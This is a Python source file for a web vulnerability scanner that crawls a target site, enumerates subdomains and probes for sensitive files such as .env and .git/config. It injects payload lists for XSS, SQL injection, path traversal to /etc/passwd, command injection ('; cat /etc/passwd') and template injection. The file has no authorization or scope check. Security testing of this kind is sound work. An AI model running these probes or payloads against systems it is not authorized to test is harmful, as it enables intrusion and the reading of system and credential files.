import requests
import re
import socket
import concurrent.futures
import sys
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, unquote, parse_qs

class AdvancedScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        })
        self.vulnerabilities = []
    
    def log_vuln(self, title, severity, desc, path):
        self.vulnerabilities.append({
            "title": title,
            "severity": severity,
            "desc": desc,
            "path": path
        })

    def crawl(self, start_url, max_depth=1):
        """
        Crawls the website to find internal links.
        Returns a set of unique internal URLs.
        """
        visited = set()
        to_visit = [(start_url, 0)]
        internal_urls = set()
        domain = urlparse(start_url).netloc
        
        while to_visit:
            url, depth = to_visit.pop(0)
            if url in visited:
                continue
            visited.add(url)
            internal_urls.add(url)
            
            if depth >= max_depth:
                continue
                
            try:
                if not url.startswith(('http', 'https')): continue
                response = self.session.get(url, timeout=5)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    full_url = urljoin(url, href)
                    parsed_link = urlparse(full_url)
                    
                    # Only internal links
                    if parsed_link.netloc == domain or parsed_link.netloc == '':
                        # Avoid duplicates and static assets
                        if full_url not in visited and not full_url.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.css', '.js', '.pdf')):
                            to_visit.append((full_url, depth + 1))
                            
            except:
                pass
                
        return internal_urls

    def scan_xss(self, url, html_content):
        """
        Reflected XSS Scanner
        """
        # 1. URL Parameter XSS
        parsed = urlparse(url)
        if parsed.query:
            payloads = [
                "<script>alert('XSS')</script>", 
                "'\"><script>alert(1)</script>", 
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)//"
            ]
            for param in parsed.query.split('&'):
                if '=' in param:
                    key = param.split('=')[0]
                    for payload in payloads:
                        try:
                            # Construct new URL with payload
                            test_query = parsed.query.replace(param, f"{key}={payload}")
                            test_url = parsed._replace(query=test_query).geturl()
                            res = self.session.get(test_url, timeout=3)
                            
                            if payload in res.text:
                                self.log_vuln(
                                    "Reflected XSS (URL)",
                                    "high",
                                    f"URL parameter '{key}' reflects input without sanitization.",
                                    test_url
                                )
                                break
                        except: pass

        # 2. Form XSS
        soup = BeautifulSoup(html_content, 'html.parser')
        forms = soup.find_all('form')
        for form in forms:
            action = form.get('action', '')
            method = form.get('method', 'get').upper()
            full_action = urljoin(url, action)
            inputs = form.find_all('input')
            
            payload = "<script>confirm(1)</script>"
            data = {}
            for inp in inputs:
                name = inp.get('name')
                if name:
                    input_type = inp.get('type', 'text')
                    if input_type in ['text', 'search', 'url', 'email', 'password', 'hidden']:
                         data[name] = payload
            
            if data:
                try:
                    if method == 'POST':
                        res = self.session.post(full_action, data=data, timeout=3)
                    else:
                        res = self.session.get(full_action, params=data, timeout=3)
                    
                    if payload in res.text:
                         self.log_vuln(
                            f"Reflected XSS (Form Method: {method})",
                            "high",
                            f"Form at {full_action} reflects malicious script input.",
                            full_action
                        )
                except: pass

    def scan_sqli(self, url, html_content):
        """
        SQL Injection Scanner
        """
        error_signatures = [
            "you have an error in your sql syntax",
            "warning: mysql",
            "unclosed quotation mark after the character string",
            "quoted string not properly terminated",
            "sql syntax error",
            "pg_query(): query failed: error"
        ]
        
        # 1. Parameter SQLi
        parsed = urlparse(url)
        if parsed.query:
            sqli_payloads = ["'", "\"", "' OR '1'='1", "1' ORDER BY 1--+", "admin' --", "1 UNION SELECT null--"]
            
            for param in parsed.query.split('&'):
                if '=' in param:
                    key = param.split('=')[0]
                    for payload in sqli_payloads:
                        try:
                             # Construct new URL with payload
                            test_query = parsed.query.replace(param, f"{key}={payload}")
                            test_url = parsed._replace(query=test_query).geturl()
                            res = self.session.get(test_url, timeout=3)
                            
                            # Check response for errors
                            for err in error_signatures:
                                if err.lower() in res.text.lower():
                                    self.log_vuln(
                                        "SQL Injection (Error Based)",
                                        "critical",
                                        f"Injected '{payload}' caused database error: {err}",
                                        test_url
                                    )
                                    # Detect Blind SQLi (simple boolean check improvement) - skipped for speed
                                    return # Stop after finding one for this URL to avoid noise
                        except: pass


    def check_lfi(self, url):
        """
        Local File Inclusion (LFI) Scanner
        """
        parsed = urlparse(url)
        if parsed.query:
            payloads = [
                "../../../../etc/passwd",
                "../../../../windows/win.ini",
                "....//....//....//etc/passwd",
                "php://filter/convert.base64-encode/resource=index.php"
            ]
            
            for param in parsed.query.split('&'):
                if '=' in param:
                    key = param.split('=')[0]
                    for payload in payloads:
                        try:
                            # Construct new URL with payload
                            test_query = parsed.query.replace(param, f"{key}={payload}")
                            test_url = parsed._replace(query=test_query).geturl()
                            res = self.session.get(test_url, timeout=3)
                            
                            if "root:x:0:0" in res.text or "[extensions]" in res.text or "[fonts]" in res.text:
                                self.log_vuln(
                                    "Local File Inclusion (LFI)",
                                    "critical",
                                    f"Successfully read system file using payload: {payload}",
                                    test_url
                                )
                                return
                        except: pass

    def check_rce(self, url):
        """
        Remote Code Execution (RCE) / Command Injection Scanner
        """
        parsed = urlparse(url)
        if parsed.query:
            # Simple, non-destructive payloads (sleep/id/whoami) usually require time-based or visible feedback
            # We will use simple concatenation markers
            payloads = [
                "; cat /etc/passwd", 
                "| cat /etc/passwd", 
                "`cat /etc/passwd`",
                "; type C:\\Windows\\win.ini"
            ]
            
            for param in parsed.query.split('&'):
                if '=' in param:
                    key = param.split('=')[0]
                    for payload in payloads:
                        try:
                            test_query = parsed.query.replace(param, f"{key}={payload}")
                            test_url = parsed._replace(query=test_query).geturl()
                            res = self.session.get(test_url, timeout=3)
                            
                            if "root:x:0:0" in res.text or "[extensions]" in res.text:
                                self.log_vuln(
                                    "Command Injection (RCE)",
                                    "critical",
                                    f"Command executed successfully via payload: {payload}",
                                    test_url
                                )
                                return
                        except: pass

    def check_ssti(self, url, html_content):
        """
        Server-Side Template Injection (SSTI) Scanner
        """
        parsed = urlparse(url)
        if parsed.query:
            # Payloads for Jinja2, Twig, etc. {{7*7}} should render 49
            payloads = ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"]
            
            for param in parsed.query.split('&'):
                if '=' in param:
                    key = param.split('=')[0]
                    for payload in payloads:
                        try:
                            test_query = parsed.query.replace(param, f"{key}={payload}")
                            test_url = parsed._replace(query=test_query).geturl()
                            res = self.session.get(test_url, timeout=3)
                            
                            if "49" in res.text and "7*7" not in res.text: # Logic: evaluated but not reflected literally
                                self.log_vuln(
                                    "Server-Side Template Injection (SSTI)",
                                    "high",
                                    f"Template engine evaluated payload: {payload} as 49",
                                    test_url
                                )
                                return
                        except: pass

    def check_open_redirect(self, url):
        """
        Open Redirect Scanner
        """
        parsed = urlparse(url)
        if parsed.query:
            payload = "http://example.com"
            redirect_params = ['url', 'next', 'target', 'dest', 'redirect', 'to', 'go', 'return']
            
            for param in parsed.query.split('&'):
                key = param.split('=')[0]
                # Only test likely redirect parameters to save time
                if key.lower() in redirect_params or 'url' in key.lower():
                    try:
                        test_query = parsed.query.replace(param, f"{key}={payload}")
                        test_url = parsed._replace(query=test_query).geturl()
                        res = self.session.get(test_url, allow_redirects=False, timeout=3)
                        
                        if res.status_code in [301, 302, 307] and "example.com" in res.headers.get('Location', ''):
                            self.log_vuln(
                                "Open Redirect",
                                "medium",
                                f"Parameter '{key}' allows redirection to arbitrary domains.",
                                test_url
                            )
                    except: pass

    def extract_js_endpoints(self, url, html_content):
        """
        Extracts API endpoints and interesting URLs from JS files
        """
        soup = BeautifulSoup(html_content, 'html.parser')
        scripts = soup.find_all('script', src=True)
        
        found_endpoints = set()
        
        for script in scripts:
            src = script.get('src')
            if not src: continue
            
            full_url = urljoin(url, src)
            try:
                # Only scan internal JS
                if urlparse(full_url).netloc == urlparse(url).netloc:
                    res = self.session.get(full_url, timeout=3)
                    content = res.text
                    
                    # Regex for finding relative paths/api endpoints in code
                    # Look for strings like "/api/v1/user" or "v1/auth"
                    # This is loose regex, but effective for discovery
                    matches = re.findall(r'["\'](\/[a-zA-Z0-9_\-\/]+|api\/[a-zA-Z0-9_\-\/]+)["\']', content)
                    
                    for m in matches:
                        m = m.strip('"\'')
                        if len(m) > 4 and '//' not in m: # Ignore comments/protocol
                            found_endpoints.add(m)
            except: pass
            
        if found_endpoints:
            self.log_vuln(
                f"JS Endpoint Discovery ({len(found_endpoints)})",
                "info",
                "Found hidden endpoints in JavaScript files: " + ", ".join(list(found_endpoints)[:10]),
                url
            )


    def check_sensitive_files(self, base_url):
        """
        Expanded sensitive file checker (Fuzzing)
        """
        files = [
            # Git / Version Control
            '.git/config', '.git/HEAD', '.svn/entries',
            # Environment / Config
            '.env', 'config.php.bak', 'web.config', 'settings.py', 'config.js',
            # Backups
            'backup.sql', 'db_dump.sql', 'users.sql', 'www.zip', 'site.tar.gz', 'backup.zip',
            # System
            'robots.txt', 'sitemap.xml', 'phpinfo.php', '.htaccess',
            # Logs
            'error_log', 'access.log', 'php_errors.log'
        ]
        
        for file in files:
            try:
                full_url = urljoin(base_url.rstrip('/') + '/', file)
                res = self.session.head(full_url, timeout=2) # HEAD request for speed
                
                if res.status_code == 200:
                    # Double check with GET for small files to confirm it's not a custom 404 page returning 200
                    if file.endswith(('.php', '.txt', '.log')):
                        r_get = self.session.get(full_url, timeout=2)
                        # Filter out soft 404s (pages that say "not found" but return 200)
                        if "not found" in r_get.text.lower() or "error" in r_get.title.string.lower() if r_get.title else False:
                             continue
                             
                    severity = "medium"
                    if file in ['.env', '.git/config', 'backup.sql']: severity = "critical"
                    if file in ['robots.txt', 'sitemap.xml']: severity = "info"
                    
                    self.log_vuln(
                        f"Sensitive File Found: {file}",
                        severity,
                        f"File accessible at {full_url}",
                        full_url
                    )
            except: pass

    def check_subdomains(self, domain):
        """
        Subdomain Enumeration (Brute-force common subdomains)
        """
        subdomains = [
            "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "webdisk", "ns2",
            "cpanel", "whm", "autodiscover", "autoconfig", "m", "imap", "test", "ns", "blog",
            "pop3", "dev", "www2", "admin", "forum", "news", "email", "ns3", "mail2", "ne1",
            "apps", "api", "mobile", "beta", "shop", "store", "secure", "vpn", "remote"
        ]
        
        found_subs = []
        
        def resolve_sub(sub):
            hostname = f"{sub}.{domain}"
            try:
                # Fast timeout DNS check
                socket.gethostbyname(hostname)
                return hostname
            except:
                return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            results = executor.map(resolve_sub, subdomains)
            
        for r in results:
            if r: found_subs.append(r)
            
        if found_subs:
            self.log_vuln(
                f"Subdomains Found ({len(found_subs)})",
                "info",
                "Discovered subdomains: " + ", ".join(found_subs),
                "DNS Enumeration"
            )

    def scan_page_worker(self, url, initial_content=None):
        """
        Thread worker function to scan a single page
        """
        try:
            if initial_content:
                content = initial_content
            else:
                res = self.session.get(url, timeout=5)
                content = res.text
            
            # Run all active scans on this page
            self.scan_xss(url, content)
            self.scan_sqli(url, content)
            self.check_lfi(url)
            self.check_rce(url)
            self.check_ssti(url, content)
            self.check_open_redirect(url)
            
            # JS Extraction only on 'main' pages or app roots (heuristically) to avoid noise
            if initial_content: 
                self.extract_js_endpoints(url, content)
                
        except Exception as e:
            pass

    def perform_scan(self, target_url):
        # 0. Initial Check
        try:
            initial_res = self.session.get(target_url, timeout=5)
            initial_content = initial_res.text
        except Exception as e:
            return {"error": str(e)}

        # 1. Crawl (Shallow) - Find interesting internal pages
        crawled_urls = self.crawl(target_url, max_depth=2) # Increased depth
        if target_url not in crawled_urls:
            crawled_urls.add(target_url)

        # 2. Parallel Scanning
        # We start the scan for the homepage immediately, then threads for others
        self.scan_page_worker(target_url, initial_content)
        
        # Remove homepage from set to avoid double scan if it was added
        if target_url in crawled_urls:
             crawled_urls.remove(target_url)
             
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            # Submit tasks
            future_to_url = {executor.submit(self.scan_page_worker, url): url for url in crawled_urls}
            
            for future in concurrent.futures.as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    future.result()
                except: pass

        # 3. Global Checks (only on base URL)
        self.check_sensitive_files(target_url)
        
        # 4. Subdomain Scan
        domain = urlparse(target_url).netloc
        self.check_subdomains(domain)

        return self.vulnerabilities

if __name__ == "__main__":
    # Standalone CLI mode
    if len(sys.argv) < 2:
        print("Usage: python vulnerability_scanner.py <url>")
        sys.exit(1)
    
    target = sys.argv[1]
    if not target.startswith("http"):
        target = "http://" + target
        
    print(f"[*] Starting Advanced Scan on {target}...")
    scanner = AdvancedScanner()
    vulns = scanner.perform_scan(target)
    
    print(f"\n[+] Scan Complete. Found {len(vulns)} issues:\n")
    for v in vulns:
        print(f"[{v['severity'].upper()}] {v['title']}")
        print(f"    {v['desc']}")
        print(f"    Path: {v['path']}\n")

